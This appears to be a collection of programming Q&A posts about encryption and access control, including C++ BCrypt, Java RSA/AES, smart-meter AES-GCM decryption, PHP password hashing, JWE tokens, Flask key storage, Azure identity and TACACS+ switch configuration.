    if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(hAesAlg, &amp;hKey, pbKeyObject, cbKeyObject, (PBYTE)ENCRYPTION_KEY, KEY_SIZE, 0))){
        wprintf(L&quot;**** Error 0x%x returned by BCryptGenerateSymmetricKey\n&quot;, status);
        goto Cleanup;
    }
    
    // Allocate memory for the plaintext or ciphertext buffercbData = inputString.length();
    if (encrypt){
        pbPlainText = (PBYTE)inputString.c_str();
        cbPlainText = cbData;
        
        // Get the size of the encrypted outputFile
        if (!NT_SUCCESS(status = BCryptEncrypt(hKey, pbPlainText, cbPlainText, NULL, pbIV, cbBlockLen, NULL, 0, &amp;cbCipherText, BCRYPT_BLOCK_PADDING))){
            wprintf(L&quot;**** Error 0x%x returned by BCryptEncrypt\n&quot;, status);
            goto Cleanup;
        }
        
        pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
        if (pbCipherText == NULL){
            wprintf(L&quot;**** memory allocation failed_pbCipherText\n&quot;);
            goto Cleanup;
        }
        
        // Perform encryption
        if (!NT_SUCCESS(status = BCryptEncrypt(hKey, pbPlainText, cbPlainText, NULL, pbIV, cbBlockLen, pbCipherText, cbCipherText, &amp;cbData, BCRYPT_BLOCK_PADDING))){
            wprintf(L&quot;**** Error 0x%x returned by BCryptEncrypt_encryption\n&quot;, status);
            goto Cleanup;
        }
        
        // Write the encrypted data to the output filebuf
        std::ofstream ofs(outputFile, std::ios::binary);
        if (!ifs){
            std::cerr &lt;&lt; &quot;Error: Failed to open input file.&quot; &lt;&lt; std::endl;
            goto Cleanup;
        }
        ofs.write(reinterpret_cast&lt;char*&gt;(pbCipherText), cbCipherText);
    } else {
        // Decrypting
        std::ifstream ifs(inputString, std::ios::binary);
        if(!ifs){
            std::cerr &lt;&lt; &quot;Error: Failed to open input file.&quot; &lt;&lt; std::endl;
            goto Cleanup;
        }
        
        // Get the size of the file
        ifs.seekg(0, std::ios::end);
        std::streampos fileSize = ifs.tellg();
        ifs.seekg(0, std::ios::beg);
        
        // Read the file content into the buffer
        pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, fileSize);
        if (pbCipherText == NULL){
            wprintf(L&quot;**** memory allocation failed_pbCipherText\n&quot;);
            goto Cleanup;
        }
        ifs.read(reinterpret_cast&lt;char*&gt;(pbCipherText), fileSize);
        cbCipherText = static_cast&lt;DWORD&gt;(fileSize);
        
        // Decrypt the data
        if (!NT_SUCCESS(status = BCryptDecrypt(hKey, pbCipherText, cbCipherText, NULL, pbIV, cbBlockLen, NULL, 0, &amp;cbPlainText, BCRYPT_BLOCK_PADDING))){
            wprintf(L&quot;**** Error 0x%x returned by BCryptDecrypt\n&quot;, status);
            goto Cleanup;
        }
        
        pbPlainText = (PBYTE)inputString.c_str();
        if (pbPlainText == NULL){
            wprintf(L&quot;**** memory allocation failed_pbPlainText\n&quot;);
            goto Cleanup;
        }
        
        // Perform decryption
        if (!NT_SUCCESS(status = BCryptDecrypt(hKey, pbCipherText, cbCipherText, NULL, pbIV, cbBlockLen, pbPlainText, cbPlainText, &amp;cbData, BCRYPT_BLOCK_PADDING))){
            wprintf(L&quot;**** Error 0x%x returned by BCryptDecrypt_decryption\n&quot;, status);
            goto Cleanup;
        }
        
        // Determine the padding length
        BYTE paddingLength = pbPlainText[cbPlainText - 1];
        
        // Remove the padding from the plaintext
        cbPlainText -= paddingLength;
        
        // Write the decrypted data to the output file
        std::ofstream ofs(outputFile, std::ios::binary);
        if (!ofs){
            std::cerr &lt;&lt; &quot;Error: Failed to open output file.&quot; &lt;&lt; std::endl;
            goto Cleanup;
        }
        ofs.write(reinterpret_cast&lt;char*&gt;(pbPlainText), cbPlainText);
    }
    
    Cleanup:
        if (pbCipherText){
            HeapFree(GetProcessHeap(), 0, pbCipherText);
        }
        if (pbPlainText){
            HeapFree(GetProcessHeap(), 0, pbPlainText);
        }
        if (pbKeyObject){
            HeapFree(GetProcessHeap(), 0, pbKeyObject);
        }
        if (pbIV){
            HeapFree(GetProcessHeap(), 0, pbIV);
        }
        if (hKey){
            BCryptDestroyKey(hKey);
        }
        if (hAesAlg){
            BCryptCloseAlgorithmProvider(hAesAlg, 0);
        }
}

int main(int argc, char* argv[])
{
    if (argc != 3){
        std::cerr &lt;&lt; &quot;Usage: &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;plain_string&gt; &lt;output_file&gt;&quot; &lt;&lt; std::endl;
        return 1;
    }
    
    std::string inputString = argv[1];
    std::string outputFile = argv[2];
    
    EncryptDecryptString(inputString, outputFile, true);
    
    std::cerr &lt;&lt; &quot;Encryption successful.&quot; &lt;&lt; std::endl;
    
    return 0;
}
</code></pre>
"
"<p>I have a situation where a Java program encrypts text using RSA/ECB/OAEPWithSHA-256AndMGF1Padding.</p>
<p>I need to do it in c# like java.</p>
<p>this is my java code</p>
<pre><code>public static final byte[] encryptRSA(PublicKey publicKey, String plaintext) throws Exception {     
        Cipher cipher = Cipher.getInstance(&quot;RSA/ECB/OAEPWithSHA-256AndMGF1Padding&quot;);   
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);    
        return cipher.doFinal(plaintext.getBytes());
    }
</code></pre>
<p>i want know to convert this java code to C#</p>
"
"<p>I am curious what kind of image encryption scheme is being employed here: <a href=""https://comic-walker.com/api/contents/viewer?episodeId=018d6b7d-6c8a-7cdd-92eb-b9696702fbc0&amp;imageSizeType=width%3A1284"" rel=""nofollow noreferrer"">https://comic-walker.com/api/contents/viewer?episodeId=018d6b7d-6c8a-7cdd-92eb-b9696702fbc0&amp;imageSizeType=width%3A1284</a></p>
<p>It looks like xor cipher but I am not sure. I tried to google about &quot;drm encryption&quot; but I could not find any relevant results. Any ideas?</p>
"
"<p>We have a Sybase ASA database with many user accounts. We want to migrate the data along those accounts to a Postgres database.</p>
<p>It is trivial to extract the username and password and create them in Postgres, however, the passwords are encrypted. To be able to compare the hashed passwords in the migrated application we need to know the exact encryption model used in Sybase.</p>
<p>The question is: what are the user account password ecryption parameters in Sybase ASA?</p>
"
"<p>Description:
I is encountering an issue wif decrypting data received from a Smart meter through teh DSMR port using UART. Teh Data is encrypte using AES-GCM 128 decryption. Despite implementing teh decryption process, teh decrypted data appears to be incomplete or corrupted. Below are teh details of teh problem and relevant code snippets:</p>
<p>Problem Description:
After decryption, some portions of teh data retrieved from teh meter are not decrypted correctly. dis is evidenced by teh output where certain parts of teh decrypted data seem to be garbled or missing.</p>
<p>here My encoded Data example:</p>
<pre><code>// uint8_t cipher [] =  {0xDB, 0x08, 0x53, 0x41, 0x47, 0x67, 0x70, 0x05, 0x4D, 0x33, 0x82, 0x04, 0xC5, 0x30, 0x00, 0x54, 0x92, 0xF3, 0xED, 0x57, 0x01, 0xC5, 0x73, 0xD0, 0x0A, 0x92, 0x89, 0xB2, 0xC2, 0xC1, 0xA1, 0x7A, 0xA4, 0xC7, 0xD2, 0x5F, 0xAE, 0xFA, 0xB7, 0xC6, 0x34, 0xCA, 0x35, 0x1D, 0xA8, 0x19, 0xA3, 0xD7, 0x77, 0xBE, 0x61, 0xE4, 0x78, 0x57, 0xDF, 0xFF, 0x71, 0x19, 0xB1, 0x14, 0xB1, 0xB2, 0xA1, 0x84, 0xCC, 0x68, 0xCD, 0x86, 0x27, 0xF0, 0x13, 0x99, 0x25, 0x1E, 0xE1, 0x6F, 0xCB, 0xEC, 0xAD, 0x30, 0xE8, 0x75, 0x6E, 0x47, 0x1E, 0xA8, 0xED, 0xA2, 0x8B, 0x81, 0xB0, 0x43, 0xAA, 0x8C, 0x36, 0xFB, 0xE4, 0x05, 0x4F, 0xC4, 0x45, 0xA5, 0x88, 0x38, 0x3E, 0xBC, 0x75, 0x7B, 0xBC, 0x6B, 0x73, 0x8E, 0x6C, 0x33, 0x6B, 0xE0, 0x36, 0x2F, 0x9A, 0x6C, 0x54, 0xD7, 0xD3, 0xA1, 0x6E, 0xF0, 0xD2, 0xE9, 0x3C, 0x84, 0x12, 0x7F, 0xBB, 0xDB, 0xB5, 0x8E, 0x4C, 0x7B, 0xF7, 0xC4, 0xC7, 0x00, 0x44, 0x92, 0xF2, 0x7A, 0xDB, 0x02, 0x96, 0xB2, 0x50, 0x0E, 0x4D, 0x40, 0x1D, 0xEC, 0xD9, 0x4D, 0x7D, 0x60, 0xBD, 0x4C, 0xC7, 0x0E, 0x1D, 0x1A, 0x1C, 0x3F, 0x51, 0xFE, 0xC5, 0x71, 0x13, 0xBB, 0x0D, 0x60, 0xAC, 0x27, 0x5C, 0xFB, 0x25, 0x94, 0xA4, 0x06, 0xCE, 0xB3, 0x3D, 0x7F, 0x74, 0xE4, 0x17, 0x2A, 0xFB, 0x80, 0x87, 0x53, 0x95, 0xE8, 0x6C, 0x1F, 0xE6, 0x7E, 0x2E, 0x3D, 0xB9, 0xB3, 0x42, 0xB8, 0x85, 0xBA, 0x4D, 0x25, 0x86, 0x8E, 0x8C, 0x36, 0xFD, 0xBE, 0x5F, 0x3E, 0x4C, 0xFD, 0xE9, 0xCE, 0x18, 0x8C, 0xCE, 0xC2, 0x3E, 0x45, 0x19, 0x4A, 0xF0, 0x87, 0x52, 0xCB, 0xE6, 0x1A, 0x02, 0xFF, 0x6D, 0x09, 0x70, 0x6F, 0x5C, 0x6B, 0x80, 0xF3, 0x2C, 0xFA, 0x9F, 0x1B, 0x9F, 0x4D, 0xEF, 0x00, 0x43, 0x07, 0xE3, 0x25, 0x65, 0x25, 0x38, 0x65, 0xD9, 0x27, 0x03, 0x94, 0x03, 0x42, 0xC8, 0x3D, 0x37, 0x3E, 0x3F, 0xEE, 0x03, 0xDB, 0x2B, 0x37, 0xBC, 0xDF, 0xBD, 0x94, 0xBB, 0xE0, 0x61, 0x6D, 0x57, 0x24, 0x5E, 0xFE, 0x04, 0x5B, 0xE3, 0x0C, 0x28, 0xBE, 0xAA, 0x5D, 0xC7, 0x22, 0x57, 0xED, 0x71, 0x81, 0x29, 0x23, 0x11, 0xA7, 0x86, 0x5C, 0xAD, 0xFF, 0x78, 0x55, 0x92, 0x2A, 0xC8, 0xD1, 0xF6, 0xA4, 0x85, 0x13, 0x2C, 0x4E, 0x82, 0x4A, 0xD0, 0x36, 0x1C, 0x3E, 0xE4, 0x09, 0x86, 0x13, 0xE0, 0xA6, 0xC9, 0x6A, 0xCC, 0x3B, 0xF3, 0x69, 0x29, 0xE1, 0x74, 0x0F, 0x78, 0x71, 0x9F, 0x82, 0xEB, 0x66, 0x7A, 0x3F, 0x01, 0x6E, 0xDE, 0xB6, 0xBC, 0xD8, 0x58, 0x91, 0x69, 0x1D, 0x27, 0xB0, 0x67, 0x23, 0x9C, 0xED, 0x59, 0x64, 0x94, 0xF9, 0xD4, 0xF4, 0x23, 0x43, 0x92, 0xDE, 0xD1, 0xF6, 0xB4, 0x68, 0xDA, 0xFA, 0x9B, 0x9E, 0xA7, 0xFC, 0xC3, 0xCB, 0x10, 0xAC, 0x67, 0xD8, 0x71, 0x06, 0xF7, 0xE3, 0x57, 0x7D, 0xDD, 0xCA, 0x36, 0xDB, 0x41, 0x6E, 0x48, 0x58, 0xC4, 0x86, 0x05, 0x59, 0xD0, 0xC0, 0x61, 0x00, 0x44, 0x6E, 0x10, 0x08, 0xF8, 0x2F, 0xD2, 0x2D, 0xD1, 0xCF, 0xFF, 0xB9, 0xC4, 0x43, 0x2A, 0x7F, 0x22, 0xB8, 0x2D, 0x26, 0x55, 0xA0, 0xA3, 0xFD, 0x45, 0x60, 0xFD, 0x45, 0x03, 0x4D, 0xC6, 0x56, 0x81, 0xFE, 0xB0, 0x68, 0x9D, 0xFC, 0x5E, 0x70, 0x00
// };
</code></pre>
<p>Teh OutPut of teh data</p>
<pre><code>Data Example:
</code></pre>
<p>Auth_Data: 30 0 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF
Init_Vect: 53 41 47 67 70 5 4D 33 0 54 92 F3
Auth_Tag: 4D C6 56 81 FE B0 68 9D FC 5E 70 0</p>
<p>Decrypted Data Example Output:</p>
<p>DMSR:
/Lux5\253663629_D</p>
<p>1-3:0.2.8(42)
0-0:1.0.0(240306104123W)
0-0:42.0.0(53414731303330373030333437343433)
1-0:1.8.0(029937.051<em>kWh)
1-0:2.8.0(000000.003</em>kWh)
1-0:3.8.0(000895.618<em>kvarh)
1-0:4.8.0(004290.916</em>kvarh)
1-0:1.7.0(01.082<em>kW)
1-0:2.7.0(00.000</em>kW)
1-0:3.7.0(00.105<em>kvar)
1-0:4.7.0(00.100</em>kvar)
0-0:17.0.0(027.6<em>kVA)
1-0:9.7    ␄   @ ␄2 ␝X &lt;.Ы ҐDǇo␞ c ␎ !9␕w/ eIX  ␌  ␘       L</em> ␑ ␗x    9!    ␅ )   x ␁  ␔K3s  ՙ ␐&quot; X  Z tn kI )ʉ| * Գ&quot;;</p>
<p>Here My Code Snipt:</p>
<pre><code>#include &lt;Crypto.h&gt;
#include &lt;AES.h&gt;
#include &lt;GCM.h&gt;

// Function to read the telegram data from Serial2
void read_telegram() {
  uint16_t serial_cnt = 0;

  // Wait for the whole stream to be available
  if (Serial2.available()) {
    delay(1500);
    Serial.println(&quot;Data Available..&quot;);
  }

  // Read data from Serial2 into telegram array
  while (Serial2.available() &amp;&amp; serial_cnt &lt; MAX_SERIAL_STREAM_LENGTH) {
    telegram[serial_cnt] = Serial2.read();
    // Check if the first bit of telegram is found
    if (telegram[0] != 0xDB) {
      Serial.println(&quot;Not found first bit..&quot;);
      // Clear the buffer
      while (Serial2.available() &gt; 0) {
        Serial2.read();
      }
      break;
    }
    serial_cnt++;
  }
  // Store the length of serial data read
  serial_data_length = serial_cnt;
  if (serial_cnt &gt; 500) { // Set a limit for serial data length
    serial_data_length = serial_cnt;
  }
}

// Function to initialize the vector for AES-GCM encryption
void init_vector(Vector_GCM *vect, const char *vect_name, uint8_t *key_SM, uint8_t *auth_data) {
  vect-&gt;name = vect_name;  // Set the vector name    
  for (int i = 0; i &lt; 16; i++) {
    vect-&gt;key[i] = key_SM[i]; // Copy the key into the vector
  }
  // Calculate the length of data from telegram
  uint16_t data_length = uint16_t(telegram[11]) * 256 + uint16_t(telegram[12]) - 17;

  // Limit the data length to avoid overflow
  if (data_length &gt; MAX_SERIAL_STREAM_LENGTH) {
    data_length = MAX_SERIAL_STREAM_LENGTH;
  }

  // Copy ciphertext from telegram into vector
  for (int i = 0; i &lt; data_length; i++) {
    vect-&gt;ciphertext[i] = telegram[i + 18];
  }

  // Copy authentication data into vector
  for (int i = 0; i &lt; 17; i++) {
    vect-&gt;authdata[i] = auth_data[i];
  }

  // Copy initialization vector (IV) from telegram into vector
  for (int i = 0; i &lt; 8; i++) {
    vect-&gt;iv[i] = telegram[2 + i];
  }

  // Copy IV from telegram into vector
  for (int i = 8; i &lt; 12; i++) {
    vect-&gt;iv[i] = telegram[6 + i];
  }

  // Copy authentication tag from telegram into vector
  for (int i = 0; i &lt; 12; i++) {
    vect-&gt;tag[i] = telegram[data_length + 18 + i];
  }

  // Set sizes of various components in the vector
  vect-&gt;authsize = 17;
  vect-&gt;datasize = data_length;
  vect-&gt;tagsize = 12;
  vect-&gt;ivsize = 12;

  // Clear the telegram array after processing
  memset(telegram, 0, MAX_SERIAL_STREAM_LENGTH);
}

// Function to decrypt and calculate the data
void decrypt_and_calculate(int samples) {
  Serial.println(&quot;-----------------------------------&quot;);
  Serial.print(&quot;Decrypt and calculate&quot;);

  // Initialize the vector for decryption
  init_vector(&amp;Vector_SM, &quot;Vector_SM&quot;, KEY_SMARTY, AUTH_DATA);
  
  // Print the initialized vector for debugging
  print_vector(&amp;Vector_SM);

  // Check if data size exceeds the maximum allowed
  if (Vector_SM.datasize != MAX_SERIAL_STREAM_LENGTH) {
    // Decrypt the text using AES-GCM
    decrypt_text(&amp;Vector_SM);
    // Parse the decrypted data
    parse_dsmr_string(buffer);
  }
  else { // Error: max datalength reached
    Serial.println(&quot;\nerror, serial stream too big&quot;);
  }
}

</code></pre>
"
"<p>After generating and encrypting a license file, I'm encountering a decryption error when trying to open the encrypted file. I've debugged the code and tried different padding types, but haven't been successful. The code block is provided below. What do you think could be the issue?</p>
<pre><code>static ObjectMapper objectMapper=new ObjectMapper();

public static void main(String[] args) throws Exception {
    KeyPairGenerator keyPairGenerator  = KeyPairGenerator.getInstance (&quot;RSA&quot;);
    keyPairGenerator.initialize(2048);
    KeyPair pair = keyPairGenerator.generateKeyPair();
    Calendar calendar = Calendar.getInstance();
    calendar.add(Calendar.DATE, 1);
    LicenseImportDTO licenseData = LicenseImportDTO.builder()
            .licenseKey (&quot;123DS92-SAKH-SKH-22&quot;)
            .contact(&quot;WORLD A.Ş.&quot;)
            .customerName(DigestUtils.md5Hex(&quot;WORLD&quot;))
            .cluster(false)
            .numberOfNodes(0)
            .numberOfSites(2)
            .duration(12)
            .licenseType(LicenseType.BASE)
            .deviceSize(DeviceSize.SMALL).build();

    String encrpyLicense = encryptExportLicenceDTO(licenseData,pair.getPublic());
    Thread.sleep(2000);
    readLicenseData(encrpyLicense,pair.getPrivate());
}

public static String encryptExportLicenceDTO(LicenseImportDTO licenceDTO, PublicKey publicKey) throws NoSuchAlgorithmException, NoSuchPaddingException, JsonProcessingException, IllegalBlockSizeException, BadPaddingException, InvalidKeyException, InvalidKeySpecException {
    KeyGenerator keyGen = KeyGenerator.getInstance(&quot;AES&quot;);
    keyGen.init(128);
    SecretKey secretKey = keyGen.generateKey();
    Cipher aesCipher = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);
    aesCipher.init(Cipher.ENCRYPT_MODE, secretKey);
    byte[] encryptedBytes = aesCipher.doFinal(objectMapper.writeValueAsString(licenceDTO).getBytes());
    Cipher rsaCipher = Cipher.getInstance(&quot;RSA/ECB/PKCS1Padding&quot;);
    rsaCipher.init(Cipher.ENCRYPT_MODE, publicKey);
    byte[] encryptedSymmetricKey = rsaCipher.doFinal(secretKey.getEncoded());
    byte[] combined = new byte[encryptedBytes.length + encryptedSymmetricKey.length];
    System.arraycopy(encryptedSymmetricKey, 0, combined, 0, encryptedSymmetricKey.length);
    System.arraycopy(encryptedBytes, 0, combined, encryptedSymmetricKey.length, encryptedBytes.length);
    return Base64.getEncoder().encodeToString(combined);
}

private static LicenseImportDTO readLicenseData(String  encodedLicense , PrivateKey privateKey) throws Exception {
    byte[] combined = Base64.getDecoder().decode(encodedLicense);
    byte[] encryptedSymmetricKey = new byte[128];
    byte[] encryptedBytes = new byte[combined.length - 128];
    System.arraycopy(combined, 0, encryptedSymmetricKey, 0, 128);
    System.arraycopy(combined, 128, encryptedBytes, 0, encryptedBytes.length);
    Cipher rsaCipher = Cipher.getInstance(&quot;RSA/ECB/PKCS1Padding&quot;);
    rsaCipher.init(Cipher.DECRYPT_MODE, privateKey);
    byte[] symmetricKeyBytes = rsaCipher.doFinal(encryptedSymmetricKey);
    SecretKey secretKey = new SecretKeySpec(symmetricKeyBytes, 0, symmetricKeyBytes.length, &quot;AES&quot;);
    Cipher aesCipher = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);
    aesCipher.init(Cipher.DECRYPT_MODE, secretKey);
    byte[] decryptedBytes = aesCipher.doFinal(encryptedBytes);
    String decryptedJson = new String(decryptedBytes, StandardCharsets.UTF_8);
    ObjectMapper objectMapper = new ObjectMapper();
    return objectMapper.readValue(decryptedJson, LicenseImportDTO.class);
}
</code></pre>
<p>I try everything but not fix this bug. My expecthing is read the license contents.</p>
"
"<p>so i am new in mongoD, i had a question about mongoDB</p>
<p>so i want to know about do mongoDB need to be migrate if i use mongoDb encryption in my unencrypted mongoDB ?</p>
<p>so for example i had unecrypted mongoDB and then my company buying  enterprise mongoDB and use the encrpytion do i need migrate my database to the encrpyted database ?</p>
"
"<p>Consider this code a web site may use for verifying a password. Note that no salt is specified, as is recommended.</p>
<pre><code>$givenPassword = /*whatever was entered*/;
//look up $username, $encryptedPassword
if (password_verify($givenPassword, $encryptedPassword))
{
   //log user in and do good things
}
</code></pre>
<p>Suppose a hacker has stolen the database and wants to know if &quot;secret&quot; is the password for $user.</p>
<pre><code>$givenPassword = &quot;secret&quot;;
//look up $username, $encryptedPassword
if (password_verify($givenPassword, $encryptedPassword))
{
   //report so hacker can do evil things
}
</code></pre>
<p>The code for encryption is identical. No salt is specified. If I don't specify the salt but PHP does, why doesn't the hacker have access to the same salt with his own PHP interpreter, so that the salt is useless? If the hacker <em>doesn't</em> have access to the salt created by my call to password_hash when he calls password_verify, how does my call to password_verify have access to the right one?</p>
<p>This question is about not about how salts work but how password_verify, not md5 or other older functions with programmer-defined salts, can share the salt with my call to password_verify without it also being available to someone else.</p>
"
"<pre><code>SELECT AES_ENCRYPT('fmale', '2b7e151628aed2a6abf7158809cf4f3c') FROM tmp_categorywise_salary_rpt LIMIT 1; 

SELECT CAST(AES_DECRYPT('þ*Ë(|¸R°¢8Ç©', '2b7e151628aed2a6abf7158809cf4f3c') as UTF8) FROM tmp_categorywise_salary_rpt LIMIT 1;
</code></pre>
<p>AES_ENCRYPT is giving me encrypted value as þ*Ë(|¸R°¢8Ç©  but using AES_DECRYPT is giving me null</p>
<p>Expectation : it should give me back non encrypted value as female</p>
"
"<p>For context, we are working in a SaaS product for clients (even from different companies in the future) to use it as a tool to integrate different AI services (custom and proprietaries) in a secured and controlled manner.</p>
<p>Among many more, we have this specific use case, where a knowledge worker would leverage a given AI model’s capabilities to get an optimized output based on some interactions this user has had with the model. This output could then be saved to be shared or reused down the line.
Regarding our product’s general architecture, we have a React frontend client, a gateway for the API, a set of Lambdas associated to different endpoints and a group of DynamoDB tables for different entities we have currently.</p>
<p>In the end, we want part of the information the user is handling, for instance the content from the AI’s model output, and some other sensitive information to be encrypted and only be read, managed or transformed by the intended recipient.</p>
<p>As an important caveat and dealbreaker, we have a searching feature in the app whose business logic interacts with the databases to retrieve the results that were previously persisted according to specific matches (keywords).
Let’s say we want some sensitive properties, in one of our data structures, to be encrypted but at the same time it’s key that information is still searchable by the right recipient and here lies the origin of our research.</p>
<p>We have been delving into the AWS Encryption SDK documentation which I guess, correct me if I’m wrong, is a general-purpose encryption solution but, in the other side, I have come across this feature (Searchable encryption) in the AWS Database Encryption SDK which is a different library altogether and both SDK’s cannot interoperate with each other due to different encryption outcomes, right?</p>
<p>Sorry if it’s still not clear enough but according to the above and your experience, which solution would you think should be more suitable for us? or in general, where should I keep delving into more to avoid as much as possible going back and forth among different solutions, documentation, etc?</p>
<p>We are in the preliminary researching steps trying to come up with a suitable solution in our situation.</p>
"
"<p>I have read about this stateless session token JWT that encapsulates user session information in a single Base64 encoded URL string including JSON data in it. The format I have understood the most was the JWS (JSON Web Signature) format, and it works indeed as follow: Client requests the server to be authenticated given some user credentials (say unique username and password). The Server then checks against the validity of these crendetials, and if everything is ok it will generate a JW token signed with a private key and send it back to the user for future authorized operations. And up to this point everything was clear to me.</p>
<p>Then I heard about the other token type: JWE (JSON Web Encryption) token. You would use this type of token to also provide confidentiality between the two parties by encrypting the payload with a private key. You would use this type of token to send information that you do not want to be read by other parties.</p>
<p>Now the confusion here is the following: <strong>To encrypt the payload you need a pair of public and private keys.</strong></p>
<p>So how and when in a practical web application should I generate these keys? In the login step when authenticating the user? Who should store these keys? The server? The client? Both? and what about when I want to authorize the user to use specific APIs? Should I just store the JWE token in the client side and use it as is to use the various APIs?</p>
<p>Everything is clear if this encryption layer was not added, like I understand how to operate with that scenario. But when these public/private keys appeared for generating such JWE token, confusion now arised!</p>
"
"<p>How correct using</p>
<pre><code>#include &lt;openssl/bio.h&gt;
#include &lt;openssl/evp.h&gt;

BIO_METHOD *   BIO_f_cipher(void);
</code></pre>
<p>I search example of symetric encrypt decrypt using <strong>BIO_f_cipher()</strong> and BIO_set_cipher()</p>
<p>I need C example bio_f_cipher because it not apear in manual.</p>
"
"<p>my company want's to make a big old monolithic project to small microservices, but we should also make auth e2ee, so I need to know is it better to make a custom auth app in kuber (no idea how to do it) or use a gateway in kuber (I don't have a clue which of them support it or even is there any of them that supports)  I need you'r advice in this b.c I am new to this microservice world</p>
<p>(we live in Iran so no aws google cloud or something like paying to international company)</p>
<p>thank you</p>
<p>i read alot of online articles but not found a best practice ftor this job so i think i stuck right now</p>
"
"<p>I'm trying to encrypt and decrypt some columns in my sqlite db, but I'm not sure how to store my encryption key. It doesn't feel right that it should be plain text in my code but I'm not sure what else I can do to hide my encryption key but at the same time have it accessible to Flask for encrypting/decrypting data into the sqlite db. This is my code so far:</p>
<p>models.py</p>
<pre><code>from flask import current_app
from itsdangerous import URLSafeTimedSerializer as Serializer
from flaskblog import db, login_manager
from sqlalchemy_utils import EncryptedType, StringEncryptedType

key = &quot;this_is_my_key&quot;

if key is None:
    raise ValueError(&quot;Encryption key not set.&quot;)

class Rx(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    rx_number = db.Column(StringEncryptedType(db.TEXT, key), nullable=True, unique=False)
    name = db.Column(StringEncryptedType(db.TEXT, key), nullable=True, unique=False)
    email = db.Column(EncryptedType(db.TEXT, key), nullable=True, unique=False)
</code></pre>
<p>config.py</p>
<pre><code>import os


class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY')
    SQLALCHEMY_DATABASE_URI = os.environ.get('SQLALCHEMY_DATABASE_URI')
    MAIL_SERVER = 'smtp.googlemail.com'
    MAIL_PORT = 587
    MAIL_USE_TLS = True
    MAIL_USERNAME = os.environ.get('EMAIL_USER')
    MAIL_PASSWORD = os.environ.get('EMAIL_PASS')


</code></pre>
"
"<p>I am working on creating a function app to query all workitems from an ADO project. Is there a way to limit the outbound calls from the function app only to the ADO API endpoint may be using outbound restrictions on NAT Gatweay? Can Service tags be applied in this case?</p>
<p><code>https://dev.azure.com/&lt;organization&gt;/&lt;project&gt;/_apis/wit/wiql?api-version=6.1-preview.2</code></p>
<p>The Azure DevOps service tag <a href=""https://learn.microsoft.com/en-us/azure/virtual-network/service-tags-overview?wt.mc_id=knwlserapi_inproduct_azportal#available-service-tags"" rel=""nofollow noreferrer"">here</a> indicates it can be used for inbound calls but was wondering if it can be used for outbound calls too.</p>
<p>Also can ADO endpoint be called via Azure backbone (private endpoints?) rather than the call routed through the internet?</p>
"
"<p>I am hardening our Azure DevOps, and now is time to prevent Azure DevOps release pipeline deletion.
I can realize it with changing security of each release, however it is too secure less, as new release will not inherit the rule.
So is there some global rule or some trick to prevent deletion of every release?</p>
"
"<p>I am trying to understand how authentication and authorisation works when using an Azure AI resource. I am following <a href=""https://learn.microsoft.com/en-us/training/modules/secure-ai-services/2-authentication"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/training/modules/secure-ai-services/2-authentication</a></p>
<p>I am not able to conceptualise the flow. From what I have understood, the objective is that <code>subscription keys</code> are not shared/stored in code. So we use <code>key vault</code>.</p>
<ul>
<li><code>key</code> of Azure AI service is stored in <code>keyvault</code></li>
<li>a <code>security principal</code> is created who can access the <code>keyvault</code>. the authentication is done via <code>entraid</code>. I don't understand how that works. It's a low level detail maybe so happy to just assume that it works</li>
<li>the <code>security principal</code> is assigned to an application or vm? That makes them <code>service principal</code>. It's just a terminology. Not really used anywhere?</li>
<li>Once application has become a <code>service principal</code> is now has a <code>managed identity</code>. Again, just a terminology.</li>
</ul>
<p>Is the above understanding correct so far?</p>
<p>From practical perspective,</p>
<ol>
<li><p>I create a <code>subdomain</code> in subscription. Why?</p>
</li>
<li><p>Then I create an AI resources. OK. This resource will have the <code>subscription key</code>.</p>
</li>
<li><p>Now I create an application who need access to the AI resource.</p>
</li>
<li><p>I assign a <code>service principal</code> to the application.</p>
</li>
<li><p>I assign role to the service principal. Eg cognitive service user. Is this like authorisation or creating a binding that this app can</p>
</li>
<li><p>access the Azure AI service creating previously. The subdomain is
limiting the access to that Azure AI service?</p>
</li>
<li><p>Then I assign a managed identity to application.</p>
</li>
<li><p>In Azure AI resource, I make the service principal member - contributor role. What is the difference between contributor and user roles?</p>
</li>
</ol>
<p>I can see the mapping between AI resource, application. I can't understand how things are being put in keyvault, how the authorisation/authentication is actually done under the hood once the mapping has been done.</p>
"
"<p>I'm attempting to deploy TACACS+ on several HPE 5120 switches remotely to integrate authentication via Active Directory instead of using generic accounts. However, I'm encountering an issue when applying the TACACS+ configuration via SSH.</p>
<p>Applied Configuration:</p>
<pre><code>hwtacacs scheme clearpass_tacacs
 primary authentication 172.17.10.x
 primary authorization 172.17.10.x
 primary accounting 172.17.10.x
 key authentication cipher &lt;cipher_key&gt;
 key authorization cipher &lt;cipher_key&gt;
 key accounting cipher &lt;cipher_key&gt;
 user-name-format without-domain
 nas-ip 192.168.1.x

domain ghtncb
 authentication login hwtacacs-scheme clearpass_tacacs local
 authorization login hwtacacs-scheme clearpass_tacacs local
 accounting login hwtacacs-scheme clearpass_tacacs
 accounting command hwtacacs-scheme clearpass_tacacs
 authorization command hwtacacs-scheme clearpass_tacacs

user-interface aux 0
authentication-mode password
set authentication password cipher &lt;password_cipher&gt;

user-interface vty 0 2
authentication-mode scheme
command authorization
command accounting
protocol inbound ssh

</code></pre>
<p>After applying this configuration, I should no longer be able to connect with the generic account, but I find not only can I still connect with this account, but I also cannot execute commands due to insufficient permissions. Furthermore, it is impossible for me to connect with an AD account.</p>
<p>When applying this configuration:</p>
<pre><code>user-interface aux 0
authentication-mode password
set authentication password cipher &lt;password_cipher&gt;

user-interface vty 0 2
authentication-mode scheme
command authorization
command accounting
protocol inbound ssh

hwtacacs scheme clearpass_tacacs
 primary authentication 172.17.10.x
 primary authorization 172.17.10.x
 primary accounting 172.17.10.x
 key authentication cipher &lt;cipher_key&gt;
 key authorization cipher &lt;cipher_key&gt;
 key accounting cipher &lt;cipher_key&gt;
 user-name-format without-domain
 nas-ip 192.168.1.x

domain ghtncb
